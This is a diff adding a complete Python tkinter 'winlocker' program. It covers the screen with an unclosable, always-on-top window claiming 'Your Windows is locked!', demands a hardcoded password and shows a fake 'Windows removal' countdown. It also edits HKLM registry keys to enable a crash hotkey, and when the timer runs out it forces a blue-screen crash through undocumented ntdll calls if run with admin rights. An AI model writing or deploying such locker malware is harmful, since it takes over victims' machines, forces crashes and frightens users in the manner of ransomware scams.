@@ -1,0 +1,92 @@
+import tkinter as tk
+from PIL import Image, ImageTk
+import sys
+import os
+import time
+import ctypes
+
+def resource_path(relative_path):
+    try:
+        base_path = sys._MEIPASS
+    except Exception:
+        base_path = os.path.abspath(".")
+    return os.path.join(base_path, relative_path)
+
+def winlock():
+    pass
+
+def changer_passwords(event):
+    if password.get() == "fsociety":
+        root.destroy()
+    else:
+        error_label.config(text="Incorrect password. Try again.")
+        password.delete(0, tk.END)
+
+def enable_bsod_hotkey():#BSOD!!!
+    try:
+        import winreg
+        key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\kbdhid\Parameters")
+        winreg.SetValueEx(key, "CrashOnCtrlScroll", 0, winreg.REG_DWORD, 1)
+        winreg.CloseKey(key)
+
+        key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\i8042prt\Parameters")
+        winreg.SetValueEx(key, "CrashOnCtrlScroll", 0, winreg.REG_DWORD, 1)
+        winreg.CloseKey(key)
+    except PermissionError:
+        print("Запусти скрипт от имени администратора!")
+        exit()
+
+def trigger_bsod():
+    ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
+    ctypes.windll.ntdll.NtRaiseHardError(0xC000021A, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))
+
+
+def start_timer():
+    global countdown
+    if countdown > 0:
+        countdown -= 1
+        timer_label.config(text=f"Time left before Windows removal!: {countdown} seconds")
+        root.after(1000, start_timer)
+    else:
+        timer_label.config(text="Time's up! Triggering BSOD...")
+        if ctypes.windll.shell32.IsUserAnAdmin():
+            trigger_bsod()
+
+root = tk.Tk()
+
+img_path = resource_path("photo.png")
+bg_image = tk.PhotoImage(file=img_path)
+
+bg_label = tk.Label(root, image=bg_image)
+bg_label.place(x=0, y=0, relwidth=1, relheight=1)
+
+x = root.winfo_screenwidth()
+y = root.winfo_screenheight()
+root.geometry(f"{x}x{y}")
+
+bg = "black"
+font = "Arial 25 bold"
+root["bg"] = bg
+
+root.protocol("WM_DELETE_WINDOW", winlock)
+root.attributes("-topmost", 1)
+root.overrideredirect(1)
+
+tk.Label(root, text="Your Windows is locked!", fg="red", bg=bg, font=font).pack()
+tk.Label(root, text="\n\n\n\nEnter your password", fg='white', bg=bg, font=font).pack()
+
+password = tk.Entry(root, font=font, show="*")
+password.pack()
+password.bind("<Return>", changer_passwords)
+
+error_label = tk.Label(root, fg="Red", bg=bg, font=("Arial", 18))
+error_label.pack(pady=20)
+
+countdown = 3600
+timer_label = tk.Label(root, fg="Red", bg=bg, font=("Arial", 25))
+timer_label.pack(pady=20)
+
+enable_bsod_hotkey()
+start_timer()
+
+root.mainloop()
